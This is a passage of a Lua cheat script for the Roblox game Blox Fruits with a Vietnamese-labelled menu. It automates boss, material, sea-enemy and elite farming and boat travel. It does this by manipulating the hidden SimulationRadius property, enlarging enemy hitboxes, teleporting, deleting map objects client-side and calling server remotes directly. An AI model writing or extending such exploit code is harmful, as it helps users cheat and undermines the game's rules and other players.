                                        sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                    until not _G.AutoBoss or not v.Parent or v.Humanoid.Health<=0
                                end
                            end
                        end
                    else
                        if game:GetService("ReplicatedStorage"):FindFirstChild(_G.SelectBoss) then
                            Tween(game:GetService("ReplicatedStorage"):FindFirstChild(_G.SelectBoss).HumanoidRootPart.CFrame*Pos)
                        end
                    end
                end)
            end
        end
    end)
    local Material = Tabs.Main:AddSection("Nguyên Liệu")
    if Sea1 then
        MaterialList={
          "Scrap Metal","Leather","Angel Wings","Magma Ore","Fish Tail"
        } elseif Sea2 then
        MaterialList={
          "Scrap Metal","Leather","Radioactive Material","Mystic Droplet","Magma Ore","Vampire Fang"
        } elseif Sea3 then
        MaterialList={
          "Scrap Metal","Leather","Demonic Wisp","Conjured Cocoa","Dragon Scale","Gunpowder","Fish Tail","Mini Tusk","Hydra Enforcer","Venomous Assailant"
        }
        end
    local DropdownMaterial = Tabs.Main:AddDropdown("DropdownMaterial", {
        Title="Chọn Nguyên Liệu",
        Description="",
        Values=MaterialList,
        Multi=false,
        Default=1,
    })
    DropdownMaterial:SetValue(SelectMaterial)
    DropdownMaterial:OnChanged(function(Value)
        SelectMaterial=Value
    end)
    local ToggleMaterial = Tabs.Main:AddToggle("ToggleMaterial", {
        Title="Cày Nguyên Liệu",
        Description="", 
        Default=false })
    ToggleMaterial:OnChanged(function(Value)
        _G.AutoMaterial=Value
        if Value==false then
            wait()
            Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
            wait()
        end
    end)
    Options.ToggleMaterial:SetValue(false)
    spawn(function()
        while task.wait() do
        if _G.AutoMaterial then
        pcall(function()
          MaterialMon(SelectMaterial)
            Tween(MPos)
          if game:GetService("Workspace").Enemies:FindFirstChild(MMon) then
          for i,v in pairs (game.Workspace.Enemies:GetChildren()) do
          if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
          if v.Name==MMon then
            repeat wait(_G.Fast_Delay)
                
          Click()


AutoHaki()
          bringmob=true
          EquipWeapon(SelectWeapon)
          Tween(v.HumanoidRootPart.CFrame*Pos)
          v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
          v.HumanoidRootPart.Transparency=1
          v.Humanoid.JumpPower=0
          v.Humanoid.WalkSpeed=0
          v.HumanoidRootPart.CanCollide=false
          FarmPos=v.HumanoidRootPart.CFrame
          MonFarm=v.Name
          until not _G.AutoMaterial or not v.Parent or v.Humanoid.Health<=0
          bringmob=false
        end
          end
          end
          else
            for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
          if string.find(v.Name, Mon) then
          if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude>=1000000000 then
          Tween(v.HumanoidRootPart.CFrame*Pos)
          end
          end
          end
          end
          end)
        end
        end
      end)
if Sea3 then
local RoughSea = Tabs.Sea:AddSection("Đảo Cáo")
local StatusKitsune = Tabs.Sea:AddParagraph({
    Title = "Trạng Thái Đảo Cáo",
    Content = ""
})
function UpdateKitsune()
    if game.Workspace._WorldOrigin.Locations:FindFirstChild('Kitsune Island') then
        StatusKitsune:SetDesc("Đảo Cáo : ✅️")
    else
        StatusKitsune:SetDesc("Đảo Cáo : ❌️")
    end
end
spawn(function()
    pcall(function()
        while wait() do
            UpdateKitsune()
        end
    end)
end)
local ToggleTPKitsune = Tabs.Sea:AddToggle("ToggleTPKitsune", {Title = "Bay Vô Đảo Cáo", Description = "", Default = false})
ToggleTPKitsune:OnChanged(function(Value)
    _G.TweenToKitsune = Value
end)
Options.ToggleTPKitsune:SetValue(false)
spawn(function()
    local kitsuneIsland
    while not kitsuneIsland do
        kitsuneIsland = game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland")
        wait(1)
    end
    while wait() do
        if _G.TweenToKitsune then
            local shrineActive = kitsuneIsland:FindFirstChild("ShrineActive")
            if shrineActive then
                for _, v in pairs(shrineActive:GetDescendants()) do
                    if v:IsA("BasePart") and v.Name:find("NeonShrinePart") then
                        Tween(v.CFrame)
                    end
                end
            end
        end
    end
end)
local ToggleCollectAzure = Tabs.Sea:AddToggle("ToggleCollectAzure", {Title = "Nhặt Linh Hồn", Description = "", Default = false})
ToggleCollectAzure:OnChanged(function(Value)
    _G.CollectAzure = Value
end)
Options.ToggleCollectAzure:SetValue(false)
spawn(function()
    while wait() do
        if _G.CollectAzure then
            pcall(function()
                if game:GetService("Workspace"):FindFirstChild("AttachedAzureEmber") then
                    Tween(game:GetService("Workspace"):WaitForChild("EmberTemplate"):FindFirstChild("Part").CFrame)
                end
            end)
        end
    end
end)
Tabs.Sea:AddButton({
    Title = "Đổi Linh Hồn",
    Description = "",
    Callback = function()            
        game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/KitsuneStatuePray"):InvokeServer()
    end
})
local RoughSea = Tabs.Sea:AddSection("Biển")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local SetSpeedBoat = 350 
local nextDistance = 3000 
local npcPosition = Vector3.new(-16665.191, 104.596, 1579.694) 
local rotationSequence = {80, -50, -80, 50} 
local currentStep = 1 
local function getPlayerBoat()
    for _, boat in pairs(Workspace.Boats:GetChildren()) do
        local seat = boat:FindFirstChild("VehicleSeat")
        if seat and seat.Occupant == character:FindFirstChild("Humanoid") then
            return boat
        end
    end
    return nil
end
RunService.RenderStepped:Connect(function()
    if not character or not character.PrimaryPart then return end
    local distance = (character.PrimaryPart.Position - npcPosition).Magnitude
    local distanceInMeters = math.floor(distance / 10)
    if distanceInMeters >= nextDistance then
        local boat = getPlayerBoat()
        if boat and boat.PrimaryPart then
            local angle = rotationSequence[currentStep]
            local newRotation = boat.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(angle), 0)
            boat:SetPrimaryPartCFrame(newRotation)
            currentStep = currentStep + 1
            if currentStep > #rotationSequence then
                currentStep = 1 
            end
            nextDistance = nextDistance + 1000
        end
    end
end)
local seatHistory, isTeleporting, notified = {}, false, false
local islandsToDelete = {
    Prehistoric = { "ShipwreckIsland", "SandIsland", "TreeIsland", "TinyIsland", "MysticIsland", "KitsuneIsland", "FrozenDimension" },
    Mirage = { "ShipwreckIsland", "SandIsland", "TreeIsland", "TinyIsland", "PrehistoricIsland", "KitsuneIsland", "FrozenDimension" },
    Frozen = { "ShipwreckIsland", "SandIsland", "TreeIsland", "TinyIsland", "MysticIsland", "KitsuneIsland", "PrehistoricIsland" }
}
local function createToggle(title, toggleKey, islands, islandName, notification)
    local toggle = Tabs.Sea:AddToggle(toggleKey, { Title = title, Default = false })
    Options[toggleKey]:SetValue(false)
    toggle:OnChanged(function(value) _G[toggleKey] = value end)
    RunService.RenderStepped:Connect(function()
        if not _G[toggleKey] then
            notified = false
            return
        end
        local humanoid = character:FindFirstChild("Humanoid")
        if not humanoid then return end
        local function tpToMyBoat()
            if isTeleporting then return end
            isTeleporting = true
            for _, seat in pairs(seatHistory) do
                if seat and seat.Parent and seat.Name == "VehicleSeat" and not seat.Occupant then
                    Tween(seat.CFrame)
                    break
                end
            end
            isTeleporting = false
        end
        local boatFound, currentBoat = false, nil
        for _, boat in pairs(Workspace.Boats:GetChildren()) do
            local seat = boat:FindFirstChild("VehicleSeat")
            if seat then
                if seat.Occupant == humanoid then
                    boatFound, currentBoat = true, seat
                    seatHistory[boat.Name] = seat
                elseif seat.Occupant == nil then
                    tpToMyBoat()
                end
            end
        end
        if not boatFound then return end
        currentBoat.MaxSpeed = SetSpeedBoat
        currentBoat.CFrame = CFrame.new(currentBoat.Position) * currentBoat.CFrame.Rotation
        VirtualInputManager:SendKeyEvent(true, "W", false, game)
        for _, part in pairs(Workspace.Boats:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
        for _, island in ipairs(islands) do
            local toDelete = Workspace.Map:FindFirstChild(island)
            if toDelete and toDelete:IsA("Model") then
                toDelete:Destroy()
            end
        end
        local targetIsland = Workspace.Map:FindFirstChild(islandName)
        if targetIsland then
            VirtualInputManager:SendKeyEvent(false, "W", false, game)
            _G[toggleKey] = false
            if not notified then
                Fluent:Notify({
                    Title = "Strix",
                    Content = notification,
                    Duration = 10
                })
                notified = true
            end
        end
    end)
end
createToggle("Tìm Đảo Dung Nham", "AutoFindPrehistoric", islandsToDelete.Prehistoric, "PrehistoricIsland", "Đảo Dung Nham Tìm Thấy")
createToggle("Tìm Đảo Bí Ẩn", "AutoFindMirage", islandsToDelete.Mirage, "MysticIsland", "Đảo Bí Ẩn Tìm Thấy")
createToggle("Tìm Đảo Leviathan", "AutoFindFrozen", islandsToDelete.Frozen, "FrozenDimension", "Đảo Leviathan Tìm Thấy")
local AutoComeTikiToggle = Tabs.Sea:AddToggle("AutoComeTiki", {
    Title="Lái Thuyền Về Đảo Tiki",
    Description="",
    Default=false
})
AutoComeTikiToggle:OnChanged(function(value)
    _G.AutoComeTiki=value 
end)
RunService.RenderStepped:Connect(function()
    if not _G.AutoComeTiki then return end 
    local player = Players.LocalPlayer
    local character = player.Character
    if not character or not character:FindFirstChild("Humanoid") then return end
    local humanoid = character.Humanoid
    local boat = nil
    for _, b in pairs(Workspace.Boats:GetChildren()) do
        local seat = b:FindFirstChild("VehicleSeat")
        if seat and seat.Occupant==humanoid then
            boat=seat
            break
        end
    end
    if boat then
        boat.MaxSpeed=SetSpeedBoat  
        local tikiPosition = CFrame.new(-16217.7568359375, 9.126761436462402, 446.06536865234375)
        local currentPosition = boat.Position
        local targetPosition = tikiPosition.Position
        local direction = (targetPosition-currentPosition).unit
        local moveVector = direction*boat.MaxSpeed*RunService.RenderStepped:Wait()
        boat.CFrame=boat.CFrame+moveVector 
        local lookAt = CFrame.new(currentPosition, targetPosition)  
        boat.CFrame=CFrame.new(boat.Position, targetPosition)  
        if (boat.Position-targetPosition).magnitude<120 then
            _G.AutoComeTiki=false
            VirtualInputManager:SendKeyEvent(false, "W", false, game) 
        end
    end
end)
local AutoComeHydraToggle = Tabs.Sea:AddToggle("AutoComeHydra", {
    Title="Lái Thuyền Về Đảo Hydra",
    Description="",
    Default=false
})
AutoComeHydraToggle:OnChanged(function(value)
    _G.AutoComeHydra=value  
end)
RunService.RenderStepped:Connect(function()
    if not _G.AutoComeHydra then return end 
    local player = Players.LocalPlayer
    local character = player.Character
    if not character or not character:FindFirstChild("Humanoid") then return end
    local humanoid = character.Humanoid
    local boat = nil
    for _, b in pairs(Workspace.Boats:GetChildren()) do
        local seat = b:FindFirstChild("VehicleSeat")
        if seat and seat.Occupant==humanoid then
            boat=seat
            break
        end
    end
    if boat then
        boat.MaxSpeed=SetSpeedBoat  
        local tikiPosition = CFrame.new(5193.9375,-0.04690289497375488, 1631.578369140625)
        local currentPosition = boat.Position
        local targetPosition = tikiPosition.Position
        local direction = (targetPosition-currentPosition).unit
        local moveVector = direction*boat.MaxSpeed*RunService.RenderStepped:Wait()
        boat.CFrame=boat.CFrame+moveVector 
        local lookAt = CFrame.new(currentPosition, targetPosition)  
        boat.CFrame=CFrame.new(boat.Position, targetPosition)  
        if (boat.Position-targetPosition).magnitude<120 then
            _G.AutoComeHydra=false 
            VirtualInputManager:SendKeyEvent(false, "W", false, game)
        end
    end
end)
Tabs.Sea:AddButton({
    Title="Bay Đến Khu Vực Săn",
    Description="",
    Callback=function()
        Tween(CFrame.new(-16917.154296875, 7.757596015930176, 511.8203125))
    end
})
local seatHistory = {}
local boatList = {"Beast Hunter", "Sleigh", "Miracle", "The Sentinel", "Guardian", "Lantern", "Dinghy", "PirateSloop", "PirateBrigade", "PirateGrandBrigade", "MarineGrandBrigade", "MarineBrigade", "MarineSloop"} 
local DropdownBoat = Tabs.Sea:AddDropdown("DropdownBoat", {
    Title="Chọn Thuyền",
    Description="",
    Values=boatList,
    Multi=false,
    Default=1,
})
DropdownBoat:SetValue(selectedBoat)
DropdownBoat:OnChanged(function(Value)
    selectedBoat=Value
end)
local function buyBoat(boatName)
    local args = {
        [1]="BuyBoat",
        [2]=boatName
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    task.delay(2, function()
        for _, boat in pairs(Workspace.Boats:GetChildren()) do
            if boat:IsA("Model") and boat.Name==boatName then
                local seat = boat:FindFirstChild("VehicleSeat")
                if seat and not seat.Occupant then
                    seatHistory[boatName]=seat
                end
            end
        end
    end)
end
local function tpToMyBoat()
    for boatName, seat in pairs(seatHistory) do
        if seat and seat.Parent and seat.Name=="VehicleSeat" and not seat.Occupant then
            Tween(seat.CFrame)
        end
    end
end
game:GetService("RunService").RenderStepped:Connect(function()
    for boatName, seat in pairs(seatHistory) do
        if seat and seat.Parent and seat.Name=="VehicleSeat" and not seat.Occupant then
            seatHistory[boatName]=seat
        end
    end
end)
Tabs.Sea:AddButton({
    Title="Mua Thuyền",
    Description="",
    Callback=function()
        buyBoat(selectedBoat)
    end
})
Tabs.Sea:AddButton({
    Title="Bay Đến Thuyền",
    Description="Duy Nhất Thuyền Bạn Mua Ở Chỗ Chọn",
    Callback=function()
        tpToMyBoat()
    end
})
local ToggleTerrorshark = Tabs.Sea:AddToggle("ToggleTerrorshark", {Title="Đấm Cá Mập", Description="", Default=false})
ToggleTerrorshark:OnChanged(function(Value)
    _G.AutoTerrorshark = Value
end)
Options.ToggleTerrorshark:SetValue(false)
_G.IsFlying = false 
spawn(function()
    while wait() do
        if _G.AutoTerrorshark then
            pcall(function()
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("Humanoid") then
                    if character.Humanoid.Health < 6000 and not _G.IsFlying then
                        _G.IsFlying = true
                        Tween(CFrame.new(character.HumanoidRootPart.Position.X, 360, character.HumanoidRootPart.Position.Z))
                    end
                    if _G.IsFlying and character.Humanoid.Health >= 8000 then
                        _G.IsFlying = false
                    end
                    if not _G.IsFlying and character.Humanoid.Health >= 8000 then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") then
                            for _, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "Terrorshark" then
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat 
                                            wait(_G.Fast_Delay)
                                            if character.Humanoid.Health < 6000 then
                                                _G.IsFlying = true
                                                Tween(CFrame.new(character.HumanoidRootPart.Position.X, 360, character.HumanoidRootPart.Position.Z))
                                                break
                                            end
                                            
                                            Click()


AutoHaki()
                                            EquipWeapon(SelectWeapon)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                            Tween(v.HumanoidRootPart.CFrame * Pos)
                                        until not _G.AutoTerrorshark or not v.Parent or v.Humanoid.Health <= 0 or _G.IsFlying
                                    end
                                end
                            end
                        else
                            if game:GetService("ReplicatedStorage"):FindFirstChild("Terrorshark") then
                                Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Terrorshark").HumanoidRootPart.CFrame * Pos)
                            end
                        end
                    end
                end
            end)
        end
    end
end)
     local TogglePiranha = Tabs.Sea:AddToggle("TogglePiranha", {Title="Đấm Piranha",Description="", Default=false })
     TogglePiranha:OnChanged(function(Value)
        _G.farmpiranya=Value
     end)
     Options.TogglePiranha:SetValue(false)
     spawn(function()
        while wait() do
            if _G.farmpiranya then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Piranha") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Piranha" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                    until not _G.farmpiranya or not v.Parent or v.Humanoid.Health<=0
                                end
                            end
                        end
                    else
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Piranha") then
                            Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Piranha").HumanoidRootPart.CFrame*Pos)
                        else  
                        end
                    end
                end)
            end
        end
     end)
     local ToggleShark = Tabs.Sea:AddToggle("ToggleShark", {Title="Đấm Cá Con",Description="", Default=false })
     ToggleShark:OnChanged(function(Value)
        _G.AutoShark=Value
     end)
     Options.ToggleShark:SetValue(false)
     spawn(function()
        while wait() do
            if _G.AutoShark then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Shark") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Shark" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        game.Players.LocalPlayer.Character.Humanoid.Sit=false
                                    until not _G.AutoShark or not v.Parent or v.Humanoid.Health<=0
                                end
                            end
                        end
                    else
                        Tween(game:GetService("Workspace").Boats.PirateGrandBrigade.VehicleSeat.CFrame*CFrame.new(0,1,0))
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Terrorshark") then
                            Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Terrorshark").HumanoidRootPart.CFrame*Pos)
                        else
                        end
                    end
                end)
            end
        end
    end)
    local ToggleFishCrew = Tabs.Sea:AddToggle("ToggleFishCrew", {Title="Đấm Tàu Cá",Description="", Default=false })
    ToggleFishCrew:OnChanged(function(Value)
       _G.AutoFishCrew=Value
    end)
    Options.ToggleFishCrew:SetValue(false)
    spawn(function()
        while wait() do
            if _G.AutoFishCrew then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name=="Fish Crew Member" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        game.Players.LocalPlayer.Character.Humanoid.Sit=false
                                    until not _G.AutoFishCrew or not v.Parent or v.Humanoid.Health<=0
                                end
                            end
                        end
                    else
                        Tween(game:GetService("Workspace").Boats.PirateGrandBrigade.VehicleSeat.CFrame*CFrame.new(0,1,0))
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Fish Crew Member") then
                            Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Fish Crew Member").HumanoidRootPart.CFrame*Pos)
                        else
                        end
                    end
                end)
            end
        end
    end)
    local ToggleShip = Tabs.Sea:AddToggle("ToggleShip", {Title="Đấm Tàu",Description="", Default=false })
    ToggleShip:OnChanged(function(Value)
        _G.Ship=Value
       end)
       Options.ToggleShip:SetValue(false)
       function CheckPirateBoat()
        local checkmmpb = {"PirateGrandBrigade", "PirateBrigade"}
        for r, v in next, game:GetService("Workspace").Enemies:GetChildren() do
            if table.find(checkmmpb, v.Name) and v:FindFirstChild("Health") and v.Health.Value>0 then
                return v
            end
        end
    end
    spawn(function()
while wait() do
    if _G.Ship then
        pcall(function()
            if CheckPirateBoat() then
                game:GetService("VirtualInputManager"):SendKeyEvent(true,32,false,game)
                wait(.5)
                game:GetService("VirtualInputManager"):SendKeyEvent(false,32,false,game)
                local v = CheckPirateBoat()
                repeat
                    wait()
                    spawn(Tween(v.Engine.CFrame*CFrame.new(0,-20, 0)), 1)
                    AimBotSkillPosition=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,-5, 0)
                    Skillaimbot=true
                    AutoSkill=false
                until not v or not v.Parent or v.Health.Value<=0 or not CheckPirateBoat()
                Skillaimbot=true
                AutoSkill=false
            end
        end)
    end
end
end)
    local ToggleGhostShip = Tabs.Sea:AddToggle("ToggleGhostShip", {Title="Đấm Tàu Ma",Description="",Default=false })
    ToggleGhostShip:OnChanged(function(Value)
        _G.GhostShip=Value
       end)
       Options.ToggleGhostShip:SetValue(false)
       function CheckPirateBoat()
        local checkmmpb = {"FishBoat"}
        for r, v in next, game:GetService("Workspace").Enemies:GetChildren() do
            if table.find(checkmmpb, v.Name) and v:FindFirstChild("Health") and v.Health.Value>0 then
                return v
            end
        end
    end
spawn(function()
while wait() do
    pcall(function()
        if _G.bjirFishBoat then
            if CheckPirateBoat() then
                game:GetService("VirtualInputManager"):SendKeyEvent(true, 32, false, game)
                wait()
                game:GetService("VirtualInputManager"):SendKeyEvent(false, 32, false, game)
                local v = CheckPirateBoat()
                repeat
                    wait()
                    spawn(Tween(v.Engine.CFrame*CFrame.new(0,-20, 0), 1))
                    AutoSkill=true
                    Skillaimbot=true
                    AimBotSkillPosition=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,-5, 0)
                until v.Parent or v.Health.Value<=0 or not CheckPirateBoat()
                AutoSkill=false
                Skillaimbot=false
            end
        end
    end)
end
end)
spawn(function()
    while wait() do
        if _G.bjirFishBoat then
               pcall(function()
                    if CheckPirateBoat() then
                        Click()


AutoHaki()
                        game:GetService("VirtualUser"):CaptureController()
                        game:GetService("VirtualUser"):Button1Down(Vector2.new(1280,672))
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip=="Melee" then
                                    game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,"C",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip=="Blox Fruit" then 
                                    game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,"V",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,"V",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait()
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip=="Sword" then 
                                    game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait()
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip=="Gun" then 
                                    game.Players.LocalPlayer.Character.Humanoid:EquipWeapon(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                    end
                end)
            end
    end
      end)
    local AutoElite = Tabs.Main:AddSection("Elite")
    local StatusElite = Tabs.Main:AddParagraph({
        Title="Trạng Thái Elite",
        Content=""
    })
    spawn(function()
        while wait() do
            pcall(function()
                if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") or game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") or game:GetService("ReplicatedStorage"):FindFirstChild("Urban") or game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
                    StatusElite:SetDesc("Elite Boss: ✅️ | Killed:  "..game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress"))    
                else
                    StatusElite:SetDesc("Elite Boss: ❌️ | Killed: "..game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress"))    
                end
            end)
        end
    end)
    local ToggleElite = Tabs.Main:AddToggle("ToggleElite", {Title="Đấm Elite",Description="", Default=false })
    ToggleElite:OnChanged(function(Value)
       _G.AutoElite=Value
       end)
       Options.ToggleElite:SetValue(false)
       spawn(function()
           while task.wait() do
               if _G.AutoElite then
                   pcall(function()
                       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                       if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==true then
                           if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
                               if game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
                                   for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                       if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                           if v.Name=="Diablo" or v.Name=="Deandre" or v.Name=="Urban" then
                                            repeat wait(_G.Fast_Delay)
                                                
                                                   EquipWeapon(SelectWeapon)
                                                   Click()


AutoHaki()
                                                   Tween(v.HumanoidRootPart.CFrame*Pos)
                                                   v.Humanoid.WalkSpeed=0
                                                   v.HumanoidRootPart.CanCollide=false
                                                   v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                               until _G.AutoElite==false or v.Humanoid.Health<=0 or not v.Parent
                                           end
                                       end
                                   end
                               else
                                   if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") then
                                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Diablo").HumanoidRootPart.CFrame*CFrame.new(2,20,2))
                                   elseif game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") then
                                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Deandre").HumanoidRootPart.CFrame*CFrame.new(2,20,2))
                                   elseif game:GetService("ReplicatedStorage"):FindFirstChild("Urban") then
